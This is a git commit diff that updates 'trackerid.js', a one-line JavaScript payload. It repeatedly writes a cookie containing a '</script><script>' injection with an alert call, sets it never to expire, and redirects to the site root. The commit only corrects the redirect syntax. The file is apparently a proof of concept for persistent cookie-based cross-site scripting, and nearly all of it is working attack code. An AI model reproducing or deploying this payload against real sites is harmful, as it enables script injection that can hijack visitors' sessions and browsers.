9719dad9f8ca2200728d9653372578896c308564
Ariel Ortmann <ariel.ortmann8@gmail.com>
2019-06-27 13:45:56 -0300

    Update trackerid.js

--- trackerid.js
+++ trackerid.js
@@ -1,1 +1,1 @@
-"";setInterval(function(){document.cookie="trackerid=ao</script><script>alert('payload in cookies')</script>; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/"},300);setTimeout(function(){window.location('/')},1500);
+"";setInterval(function(){document.cookie="trackerid=ao</script><script>alert('payload in cookies')</script>; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/"},300);setTimeout(function(){window.location='/'},1500);
